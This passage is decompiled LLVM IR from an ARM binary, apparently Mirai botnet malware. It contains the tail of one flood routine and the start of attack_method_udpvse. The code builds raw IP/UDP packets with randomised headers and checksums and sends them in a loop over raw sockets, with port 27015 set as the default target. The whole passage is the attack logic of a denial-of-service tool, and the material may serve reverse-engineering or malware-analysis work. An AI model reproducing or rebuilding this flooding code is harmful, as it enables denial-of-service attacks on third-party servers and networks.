  %v4_9ea4 = inttoptr i32 %v3_9ea4 to i32*
  store i32 %v4_9ea0, i32* %v4_9ea4, align 4
  br label %dec_label_pc_9eac

dec_label_pc_9eac:                                ; preds = %bb85, %.thread16
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_9eb8:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034, %dec_label_pc_a048
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9ebc = load i32, i32* @r5, align 4
  %v3_9ebc = add i32 %v2_9ebc, 10
  %v4_9ebc = inttoptr i32 %v3_9ebc to i16*
  store i16 0, i16* %v4_9ebc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ec4 = load i32, i32* @r5, align 4
  store i32 %v0_9ec4, i32* @r0, align 4
  %v2_9ec8 = call i32 @checksum_generic(i32 %v0_9ec4, i32 20)
  %v3_9ec8 = trunc i32 %v2_9ec8 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9ed0 = load i32, i32* @r5, align 4
  %v4_9ed0 = add i32 %v3_9ed0, 10
  %v5_9ed0 = inttoptr i32 %v4_9ed0 to i16*
  store i16 %v3_9ec8, i16* %v5_9ed0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9ed8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9ed8 = trunc i32 %v0_9ed8 to i16
  %v2_9ed8 = load i32, i32* @r6, align 4
  %v3_9ed8 = add i32 %v2_9ed8, 10
  %v4_9ed8 = inttoptr i32 %v3_9ed8 to i16*
  store i16 %v1_9ed8, i16* %v4_9ed8, align 2
  %v0_9edc = load i32, i32* @r6, align 4
  store i32 %v0_9edc, i32* @r0, align 4
  %v2_9ee0 = call i32 @checksum_generic(i32 %v0_9edc, i32 20)
  %v3_9ee0 = trunc i32 %v2_9ee0 to i16
  %v3_9ee4 = load i32, i32* @r6, align 4
  %v4_9ee4 = add i32 %v3_9ee4, 10
  %v5_9ee4 = inttoptr i32 %v4_9ee4 to i16*
  store i16 %v3_9ee0, i16* %v5_9ee4, align 2
  store i32 0, i32* @r4, align 4
  %v0_9eec = load i32, i32* @r7, align 4
  store i32 %v0_9eec, i32* @r1, align 4
  %v1_9ef0 = add i32 %v0_9eec, 4
  %v2_9ef0 = inttoptr i32 %v1_9ef0 to i16*
  %v3_9ef0 = load i16, i16* %v2_9ef0, align 2
  %v4_9ef0 = zext i16 %v3_9ef0 to i32
  store i32 %v4_9ef0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_9ef8 = add i32 %v0_9eec, 6
  %v4_9ef8 = inttoptr i32 %v3_9ef8 to i16*
  store i16 0, i16* %v4_9ef8, align 2
  %v0_9efc = load i32, i32* @r6, align 4
  %v4_9f00 = call i32 @checksum_tcpudp(i32 %v0_9efc, i32 %v0_9eec, i32 %v4_9ef0, i32 %stack_var_-124.0.ph)
  %v5_9f00 = trunc i32 %v4_9f00 to i16
  %v3_9f04 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f04, i32* %r2.global-to-local, align 4
  %v3_9f08 = mul i32 %v3_9f04, 32
  store i32 %v3_9f08, i32* %r3.global-to-local, align 4
  %v0_9f0c = load i32, i32* @r5, align 4
  %v1_9f0c = add i32 %v0_9f0c, 16
  %v2_9f0c = inttoptr i32 %v1_9f0c to i32*
  %v3_9f0c = load i32, i32* %v2_9f0c, align 4
  %v5_9f10 = mul i32 %v3_9f04, 24
  store i32 %v5_9f10, i32* %r3.global-to-local, align 4
  %v1_9f14 = load i32, i32* @sb, align 4
  %v2_9f14 = add i32 %v1_9f14, %v5_9f10
  store i32 %v2_9f14, i32* @lr, align 4
  %v2_9f18 = add i32 %v2_9f14, 4
  %v3_9f18 = inttoptr i32 %v2_9f18 to i32*
  store i32 %v3_9f0c, i32* %v3_9f18, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9f20 = load i32, i32* @r7, align 4
  %v4_9f20 = add i32 %v3_9f20, 6
  %v5_9f20 = inttoptr i32 %v4_9f20 to i16*
  store i16 %v5_9f00, i16* %v5_9f20, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9f28 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f28 = trunc i32 %v0_9f28 to i16
  %v2_9f28 = load i32, i32* %r3.global-to-local, align 4
  %v3_9f28 = load i32, i32* @sb, align 4
  %v4_9f28 = add i32 %v3_9f28, %v2_9f28
  %v5_9f28 = inttoptr i32 %v4_9f28 to i16*
  store i16 %v1_9f28, i16* %v5_9f28, align 2
  %v0_9f2c = load i32, i32* @r4, align 4
  %v1_9f2c = trunc i32 %v0_9f2c to i16
  %v2_9f2c = load i32, i32* @lr, align 4
  %v3_9f2c = add i32 %v2_9f2c, 2
  %v4_9f2c = inttoptr i32 %v3_9f2c to i16*
  store i16 %v1_9f2c, i16* %v4_9f2c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9f34 = load i32, i32* @r5, align 4
  store i32 %v0_9f34, i32* %r1.global-to-local, align 4
  %v0_9f3c = load i32, i32* @r8, align 4
  store i32 %v0_9f3c, i32* %r2.global-to-local, align 4
  %v0_9f40 = load i32, i32* @lr, align 4
  %v0_9f44 = load i32, i32* %ip.global-to-local, align 4
  %v6_9f48 = call i32 @__libc_sendto(i32 %v3_9bbc, i32 %v0_9f34, i32 %v0_9f3c, i32 16384, i32 %v0_9f40, i32 %v0_9f44)
  %v3_9f4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9f4c, i32* %r3.global-to-local, align 4
  %v1_9f50 = add i32 %v3_9f4c, 1
  %v1_9f54 = load i32, i32* @sl, align 4
  %v9_9f54 = icmp eq i32 %v1_9f50, %v1_9f54
  store i1 %v9_9f54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9f50, i32* %stack_var_-44, align 4
  %v6_9f5c = icmp slt i32 %v1_9f50, %v1_9f54
  br i1 %v6_9f5c, label %dec_label_pc_9e3c, label %dec_label_pc_9e28

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9e3c
  %v1_9f64 = add i32 %v2_9e44, 16
  %v2_9f64 = inttoptr i32 %v1_9f64 to i32*
  %v3_9f64 = load i32, i32* %v2_9f64, align 4
  store i32 %v3_9f64, i32* %r4.global-to-local, align 4
  %v0_9f68 = call i32 @rand_next()
  %v3_9f6c = load i32, i32* %stack_var_-44, align 4
  %v5_9f74 = mul i32 %v3_9f6c, 24
  %v0_9f78 = load i32, i32* %r4.global-to-local, align 4
  %v1_9f78 = and i32 %v0_9f78, 16711680
  store i32 %v1_9f78, i32* %ip.global-to-local, align 4
  %v3_9f7c = udiv i32 %v0_9f78, 16777216
  %v4_9f80 = udiv i32 %v1_9f78, 256
  %v5_9f80 = or i32 %v4_9f80, %v3_9f7c
  store i32 %v5_9f80, i32* %r2.global-to-local, align 4
  %v1_9f84 = load i32, i32* @sb, align 4
  %v2_9f84 = add i32 %v1_9f84, %v5_9f74
  store i32 %v2_9f84, i32* %r1.global-to-local, align 4
  %v1_9f88 = and i32 %v0_9f78, 65280
  store i32 %v1_9f88, i32* %r3.global-to-local, align 4
  %v1_9f8c = add i32 %v2_9f84, 20
  %v2_9f8c = inttoptr i32 %v1_9f8c to i8*
  %v3_9f8c = load i8, i8* %v2_9f8c, align 1
  %v4_9f8c = zext i8 %v3_9f8c to i32
  store i32 %v4_9f8c, i32* %ip.global-to-local, align 4
  %v5_9f94 = call i32 @llvm.bswap.i32(i32 %v0_9f78)
  %v7_9f98 = lshr i32 %v0_9f68, %v4_9f8c
  %v8_9f98 = add i32 %v7_9f98, %v5_9f94
  store i32 %v8_9f98, i32* %r2.global-to-local, align 4
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  %v5_9fb4 = call i32 @llvm.bswap.i32(i32 %v8_9f98)
  store i32 %v5_9fb4, i32* %r3.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  %v1_9fbc = load i32, i32* @r5, align 4
  %v2_9fbc = add i32 %v1_9fbc, 16
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 %v5_9fb4, i32* %v3_9fbc, align 4
  br i1 %v2_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9fc4:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  %v0_9fc4 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9fd0 = load i32, i32* @fp, align 4
  %v9_9fd0 = icmp eq i32 %v0_9fd0, 65535
  store i1 %v9_9fd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9fd4 = load i32, i32* @r5, align 4
  %v2_9fd4 = add i32 %v1_9fd4, 12
  %v3_9fd4 = inttoptr i32 %v2_9fd4 to i32*
  store i32 %v0_9fc4, i32* %v3_9fd4, align 4
  br i1 %v9_9fd0, label %dec_label_pc_9fdc, label %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge

dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge:    ; preds = %dec_label_pc_9fc4
  %v1_9e84.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e80

dec_label_pc_9fdc:                                ; preds = %dec_label_pc_9fc4, %dec_label_pc_9e70
  %v0_9fdc = call i32 @rand_next()
  %v3_9fe4 = urem i32 %v0_9fdc, 65536
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v1_9ff0 = sub nsw i32 999, %v3_9fe4
  store i32 %v1_9ff0, i32* %r3.global-to-local, align 4
  %v1_9ff4 = load i32, i32* %r4.global-to-local, align 4
  %v9_9ff4 = icmp eq i32 %v3_9c08, %v1_9ff4
  store i1 %v9_9ff4, i1* %cpsr_z.global-to-local, align 1
  %v1_9ff8 = trunc i32 %v0_9fdc to i16
  %v2_9ff8 = load i32, i32* @r5, align 4
  %v3_9ff8 = add i32 %v2_9ff8, 4
  %v4_9ff8 = inttoptr i32 %v3_9ff8 to i16*
  store i16 %v1_9ff8, i16* %v4_9ff8, align 2
  %v0_9ffc = load i32, i32* %r3.global-to-local, align 4
  %v1_9ffc = trunc i32 %v0_9ffc to i16
  %v2_9ffc = load i32, i32* @r6, align 4
  %v3_9ffc = add i32 %v2_9ffc, 4
  %v4_9ffc = inttoptr i32 %v3_9ffc to i16*
  store i16 %v1_9ffc, i16* %v4_9ffc, align 2
  br i1 %v9_9ff4, label %dec_label_pc_a004, label %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge

dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge:    ; preds = %dec_label_pc_9fdc
  %v1_9e90.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9e8c

dec_label_pc_a004:                                ; preds = %dec_label_pc_9fdc, %dec_label_pc_9e80
  %v0_a004 = call i32 @rand_next()
  %v1_a004 = trunc i32 %v0_a004 to i16
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v1_a00c = load i32, i32* %r4.global-to-local, align 4
  %v9_a00c = icmp eq i32 %v3_9c0c, %v1_a00c
  store i1 %v9_a00c, i1* %cpsr_z.global-to-local, align 1
  %v3_a010 = load i32, i32* @r5, align 4
  %v4_a010 = add i32 %v3_a010, 44
  %v5_a010 = inttoptr i32 %v4_a010 to i16*
  store i16 %v1_a004, i16* %v5_a010, align 2
  br i1 %v9_a00c, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_a018:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  %v0_a018 = call i32 @rand_next()
  %v1_a018 = trunc i32 %v0_a018 to i16
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %.thread30, label %bb85

.thread30:                                        ; preds = %dec_label_pc_a018
  %v3_a02831 = load i32, i32* @r7, align 4
  %v4_a02832 = add i32 %v3_a02831, 2
  %v5_a02833 = inttoptr i32 %v4_a02832 to i16*
  store i16 %v1_a018, i16* %v5_a02833, align 2
  br label %dec_label_pc_a034

bb85:                                             ; preds = %dec_label_pc_a018
  %v1_a024 = load i32, i32* @r5, align 4
  %v2_a024 = add i32 %v1_a024, 16
  %v3_a024 = inttoptr i32 %v2_a024 to i32*
  %v4_a024 = load i32, i32* %v3_a024, align 4
  store i32 %v4_a024, i32* %r3.global-to-local, align 4
  %v3_a028 = load i32, i32* @r7, align 4
  %v4_a028 = add i32 %v3_a028, 2
  %v5_a028 = inttoptr i32 %v4_a028 to i16*
  store i16 %v1_a018, i16* %v5_a028, align 2
  %v1_a02c = load i32, i32* %r3.global-to-local, align 4
  %v2_a02c = load i32, i32* @r6, align 4
  %v3_a02c = add i32 %v2_a02c, 16
  %v4_a02c = inttoptr i32 %v3_a02c to i32*
  store i32 %v1_a02c, i32* %v4_a02c, align 4
  br label %dec_label_pc_9eac

dec_label_pc_a034:                                ; preds = %.thread30, %dec_label_pc_9e98
  %v0_a034 = call i32 @rand_next()
  store i32 %v1_9b74, i32* %r1.global-to-local, align 4
  store i1 %v2_a03c, i1* %cpsr_z.global-to-local, align 1
  %v1_a040 = load i32, i32* @r6, align 4
  %v2_a040 = add i32 %v1_a040, 16
  %v3_a040 = inttoptr i32 %v2_a040 to i32*
  store i32 %v0_a034, i32* %v3_a040, align 4
  br i1 %v2_a03c, label %dec_label_pc_9eb8, label %dec_label_pc_a048

dec_label_pc_a048:                                ; preds = %dec_label_pc_9eac, %dec_label_pc_a034
  %v0_a048 = load i32, i32* @r7, align 4
  %v1_a048 = add i32 %v0_a048, 8
  store i32 %v5_9b54, i32* %r1.global-to-local, align 4
  %v2_a050 = inttoptr i32 %v1_a048 to i16*
  %v3_a050 = call i32 @rand_str(i16* %v2_a050, i32 %v5_9b54)
  br label %dec_label_pc_9eb8

dec_label_pc_a058:                                ; preds = %dec_label_pc_9bcc
  %v1_a05c = call i32 @__GI___libc_close(i32 %v3_9bbc)
  br label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %entry, %dec_label_pc_a058
  %v1_a068 = phi i32 [ %v3_9bbc, %entry ], [ %v1_a05c, %dec_label_pc_a058 ]
  store i32 %v3_9a6c, i32* %r4.global-to-local, align 4
  store i32 %v6_9a6c, i32* %r5.global-to-local, align 4
  store i32 %v24_9a6c, i32* %fp.global-to-local, align 4
  ret i32 %v1_a068

dec_label_pc_a06c:                                ; preds = %dec_label_pc_9bf4
  store i32 %v5_9b54, i32* %r2.global-to-local, align 4
  %v1_a074 = add i32 %v5_9b54, 8
  store i32 %v1_a074, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9e28.preheader

; uselistorder directives
  uselistorder i32 %v1_a074, { 1, 0 }
  uselistorder i16 %v1_a018, { 1, 0 }
  uselistorder i32 %v0_9fdc, { 1, 0 }
  uselistorder i32 %v5_9fb4, { 1, 0 }
  uselistorder i32 %v0_9f78, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9f54, { 1, 2, 0 }
  uselistorder i32 %v1_9f50, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9f04, { 1, 0, 2 }
  uselistorder i32 %v0_9eec, { 1, 0, 2, 3 }
  uselistorder i32 %v7_9e50, { 1, 0, 2 }
  uselistorder i1 %v7_9e68, { 2, 1, 0 }
  uselistorder i1 %v2_a03c, { 2, 3, 1, 0 }
  uselistorder i1 %v2_a020, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9dc4, { 1, 0 }
  uselistorder i32 %v4_9d3813, { 1, 0 }
  uselistorder i32 %v3_9c5c, { 1, 0 }
  uselistorder i32 %v3_9c40, { 1, 2, 0 }
  uselistorder i32 %v1_9c3c, { 1, 0 }
  uselistorder i32 %v1_9c00, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9bfc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9bf8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9bf4, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9bec, { 1, 0 }
  uselistorder i1 %v7_9bc0, { 1, 0 }
  uselistorder i32 %v3_9bbc, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v5_9ba8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_9b74, { 2, 1, 3, 0 }
  uselistorder i32 %v5_9b54, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_9b08, { 1, 0 }
  uselistorder i32 %v1_9ae4, { 2, 1, 0 }
  uselistorder i32 %v5_9adc, { 1, 0 }
  uselistorder i8 %v5_9ac0, { 0, 2, 1 }
  uselistorder i32 %v6_9aa0, { 1, 0 }
  uselistorder i32 %v2_9a88, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 25, 24, 26, 27, 29, 28, 30, 31, 33, 32, 35, 34, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
  uselistorder label %dec_label_pc_a048, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9e28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9e28.preheader, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
}

define i32 @attack_method_udpvse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_a088 = load i32, i32* @r4, align 4
  %v27_a088 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a0a4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a0a8 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0a4, i32* @fp, align 4
  %v0_a0b8 = load i32, i32* @r4, align 4
  %v4_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v5_a0bc = call i32 @attack_get_opt_int(i32 %v0_a0b8, i32* %v4_a0bc, i32 2, i32 0)
  %v1_a0c8 = urem i32 %v5_a0bc, 256
  store i32 %v1_a0c8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a0d4 = load i32, i32* @r4, align 4
  %v0_a0d8 = load i32, i32* @r5, align 4
  %v5_a0dc = trunc i32 %v5_a0bc to i8
  %v6_a0e0 = inttoptr i32 %v0_a0d8 to i32*
  %v7_a0e0 = call i32 @attack_get_opt_int(i32 %v0_a0d4, i32* %v6_a0e0, i32 3, i32 65535)
  %v0_a0e4 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0e0, i32* @r7, align 4
  %v0_a0f4 = load i32, i32* @r4, align 4
  %v4_a0f8 = inttoptr i32 %v0_a0e4 to i32*
  %v5_a0f8 = call i32 @attack_get_opt_int(i32 %v0_a0f4, i32* %v4_a0f8, i32 4, i32 64)
  %v1_a100 = urem i32 %v5_a0f8, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  %v0_a104 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  %v6_a118 = inttoptr i32 %v0_a104 to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 5, i32 0)
  %v1_a124 = urem i32 %v7_a118, 256
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a130 = load i32, i32* @r4, align 4
  %v0_a134 = load i32, i32* @r5, align 4
  %v5_a13c = inttoptr i32 %v0_a134 to i32*
  %v6_a13c = call i32 @attack_get_opt_int(i32 %v0_a130, i32* %v5_a13c, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a14c = load i32, i32* @r5, align 4
  store i32 %v6_a13c, i32* @r6, align 4
  %v0_a154 = load i32, i32* @r4, align 4
  %v4_a158 = inttoptr i32 %v0_a14c to i32*
  %v5_a158 = call i32 @attack_get_opt_int(i32 %v0_a154, i32* %v4_a158, i32 7, i32 27015)
  store i32 %v5_a158, i32* @r4, align 4
  %v1_a164 = call i32 @table_unlock_val(i32 20)
  %v3_a170 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_a184 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_a188 = icmp eq i32 %v3_a184, -1
  store i1 %v7_a188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a184, i32* @sb, align 4
  br i1 %v7_a188, label %dec_label_pc_a4b0, label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a19c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a19c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a1b0 = call i32 @__GI_setsockopt(i32 %v3_a184, i32 0, i32 3, i32 %v6_a19c, i32 ptrtoint (i32* @0 to i32))
  %v7_a1b4 = icmp eq i32 %v5_a1b0, -1
  store i1 %v7_a1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b4, label %dec_label_pc_a4a8, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a194
  %v0_a1bc = load i32, i32* @r4, align 4
  %v3_a1bc = mul i32 %v0_a1bc, 65536
  store i32 %v3_a1bc, i32* @lr, align 4
  %v0_a1c0 = load i32, i32* @r7, align 4
  %v0_a1c4 = load i32, i32* @r6, align 4
  %v3_a1c4 = mul i32 %v0_a1c4, 65536
  store i32 %v3_a1c4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_a1cc = urem i32 %v0_a1c0, 65536
  %v3_a1d0 = urem i32 %v0_a1c4, 65536
  store i32 %v3_a1d0, i32* %r2.global-to-local, align 4
  %v3_a1d4 = urem i32 %v0_a1bc, 65536
  store i32 %v3_a1d4, i32* %r3.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r8, align 4
  %v2_a1d8 = icmp eq i32 %v0_a1d8, 0
  store i1 %v2_a1d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a1d8, label %dec_label_pc_a314.preheader, label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a1bc
  %tmp34 = mul i32 %v0_a1c0, 256
  %v3_a200 = and i32 %tmp34, 65280
  store i32 %v3_a200, i32* %r3.global-to-local, align 4
  %tmp35 = mul i32 %v0_a1c4, 256
  %v3_a204 = and i32 %tmp35, 65280
  store i32 %v3_a204, i32* %r2.global-to-local, align 4
  %tmp36 = mul i32 %v0_a1bc, 256
  %v3_a208 = and i32 %tmp36, 65280
  %tmp37 = udiv i32 %v0_a1c0, 256
  %v4_a20c = urem i32 %tmp37, 256
  %v5_a20c = or i32 %v4_a20c, %v3_a200
  store i32 %v5_a20c, i32* @r5, align 4
  %tmp38 = udiv i32 %v0_a1c4, 256
  %v4_a210 = urem i32 %tmp38, 256
  %v5_a210 = or i32 %v4_a210, %v3_a204
  store i32 %v5_a210, i32* @r6, align 4
  %tmp39 = udiv i32 %v0_a1bc, 256
  %v4_a214 = urem i32 %tmp39, 256
  %v5_a214 = or i32 %v4_a214, %v3_a208
  store i32 %v5_a214, i32* @r7, align 4
  %v1_a29c = trunc i32 %v5_a0f8 to i8
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %.thread, %dec_label_pc_a1f0
  %v2_a220 = call i32 @calloc(i32 128, i32 1)
  %v3_a224 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a224, i32* %r2.global-to-local, align 4
  %v5_a22c = mul i32 %v3_a224, 24
  store i32 %v5_a22c, i32* %r3.global-to-local, align 4
  %v1_a230 = load i32, i32* @fp, align 4
  %v2_a230 = load i32, i32* @r4, align 4
  %v5_a230 = mul i32 %v2_a230, 4
  %v6_a230 = add i32 %v5_a230, %v1_a230
  %v7_a230 = inttoptr i32 %v6_a230 to i32*
  store i32 %v2_a220, i32* %v7_a230, align 4
  %v0_a234 = load i32, i32* %r3.global-to-local, align 4
  %v1_a234 = load i32, i32* @sl, align 4
  %v2_a234 = add i32 %v1_a234, %v0_a234
  store i32 %v2_a234, i32* %r3.global-to-local, align 4
  %v0_a238 = load i32, i32* @fp, align 4
  %v1_a238 = load i32, i32* %r2.global-to-local, align 4
  %v4_a238 = mul i32 %v1_a238, 4
  %v5_a238 = add i32 %v4_a238, %v0_a238
  %v6_a238 = inttoptr i32 %v5_a238 to i32*
  %v7_a238 = load i32, i32* %v6_a238, align 4
  store i32 %v7_a238, i32* @lr, align 4
  %v1_a240 = inttoptr i32 %v7_a238 to i8*
  %v2_a240 = load i8, i8* %v1_a240, align 1
  %tmp = urem i8 %v2_a240, 16
  %v1_a244 = zext i8 %tmp to i32
  %v1_a248 = or i32 %v1_a244, 64
  store i32 %v1_a248, i32* %r3.global-to-local, align 4
  %v1_a250 = trunc i32 %v1_a248 to i8
  store i8 %v1_a250, i8* %v1_a240, align 1
  %v0_a254 = load i32, i32* @lr, align 4
  %v1_a254 = inttoptr i32 %v0_a254 to i8*
  %v2_a254 = load i8, i8* %v1_a254, align 1
  %v1_a258 = and i8 %v2_a254, -16
  %v1_a25c = or i8 %v1_a258, 5
  store i8 %v1_a25c, i8* %v1_a254, align 1
  %v2_a268 = load i32, i32* @lr, align 4
  %v3_a268 = add i32 %v2_a268, 1
  %v4_a268 = inttoptr i32 %v3_a268 to i8*
  store i8 %v5_a0dc, i8* %v4_a268, align 1
  %v3_a26c = load i32, i32* %stack_var_-48, align 4
  %v3_a270 = mul i32 %v3_a26c, 65536
  %v1_a274 = add i32 %v3_a270, 2097152
  %v3_a278 = udiv i32 %v1_a274, 256
  %v4_a280 = udiv i32 %v1_a274, 16777216
  %v5_a280 = or i32 %v3_a278, %v4_a280
  %v3_a284 = urem i32 %v3_a26c, 65536
  store i32 %v3_a284, i32* %r2.global-to-local, align 4
  %v1_a288 = trunc i32 %v5_a280 to i16
  %v2_a288 = load i32, i32* @lr, align 4
  %v3_a288 = add i32 %v2_a288, 2
  %v4_a288 = inttoptr i32 %v3_a288 to i16*
  store i16 %v1_a288, i16* %v4_a288, align 2
  %v0_a28c = load i32, i32* %r2.global-to-local, align 4
  %v1_a28c = mul i32 %v0_a28c, 65536
  %v3_a294 = add i32 %v1_a28c, 786432
  store i32 %v3_a294, i32* %r2.global-to-local, align 4
  store i32 %v1_a124, i32* %ip.global-to-local, align 4
  %v2_a29c = load i32, i32* @lr, align 4
  %v3_a29c = add i32 %v2_a29c, 8
  %v4_a29c = inttoptr i32 %v3_a29c to i8*
  store i8 %v1_a29c, i8* %v4_a29c, align 1
  %v0_a2a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_a2a0 = udiv i32 %v0_a2a0, 256
  %v1_a2a4 = and i32 %v3_a2a0, 65280
  %v0_a2a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_a2a8 = icmp eq i32 %v0_a2a8, 0
  store i1 %v2_a2a8, i1* %cpsr_z.global-to-local, align 1
  %v4_a2ac = udiv i32 %v0_a2a0, 16777216
  %v5_a2ac = or i32 %v1_a2a4, %v4_a2ac
  store i32 %v5_a2ac, i32* %ip.global-to-local, align 4
  %v2_a2b4 = load i32, i32* @lr, align 4
